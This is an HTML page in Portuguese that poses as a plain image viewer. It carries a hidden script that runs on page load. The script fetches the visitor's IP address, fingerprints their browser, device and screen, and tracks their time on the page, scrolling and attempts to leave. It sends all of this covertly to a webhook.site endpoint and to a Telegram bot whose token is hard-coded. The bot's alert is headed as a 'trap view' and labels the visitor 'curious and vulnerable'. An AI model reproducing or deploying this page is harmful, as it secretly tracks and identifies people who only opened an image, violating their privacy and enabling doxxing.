
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Imagem</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
    }
    img {
      width: 100%;
      height: auto;
      display: block;
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="Imagem">
  <script>
    const inicio = Date.now();
    let scrollMax = 0;
    let tentouSair = false;

    document.addEventListener("scroll", () => {
      scrollMax = Math.max(scrollMax, window.scrollY);
    });

    document.addEventListener("mouseout", function (e) {
      if (e.clientY < 0) tentouSair = true;
    });

    async function rastrearEEnviar() {
      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "N/A");

      const dados = {
        ip: ip,
        dispositivo: navigator.userAgent,
        fingerprint: navigator.userAgent + navigator.language + screen.width + screen.height,
        horario: new Date().toLocaleString(),
        plataforma: navigator.platform,
        idioma: navigator.language,
        resolucao: screen.width + "x" + screen.height,
        comportamento: {
          tempoNaPaginaSeg: Math.floor((Date.now() - inicio) / 1000),
          rolouPaginaAte: scrollMax,
          tentouSair: tentouSair
        },
        imagem: "https://imgur.com/a/UodXBtb",
        sentimento: "curioso e vulnerável"
      };

      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dados)
      });

      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 94845670,
          text: `
⚠️ VISUALIZAÇÃO ARMADILHA ⚠️

IP: ${dados.ip}
Device: ${dados.dispositivo}
Plataforma: ${dados.plataforma}
Idioma: ${dados.idioma}
Resolução: ${dados.resolucao}
Fingerprint: ${dados.fingerprint}
Horário: ${dados.horario}
Tempo na página: ${dados.comportamento.tempoNaPaginaSeg}s
Scroll máximo: ${dados.comportamento.rolouPaginaAte}px
Tentou sair: ${dados.comportamento.tentouSair ? "SIM" : "não"}
Imagem exibida: ${dados.imagem}
Sentimento: ${dados.sentimento}
`
        })
      });
    }

    rastrearEEnviar();
  </script>
</body>
</html>
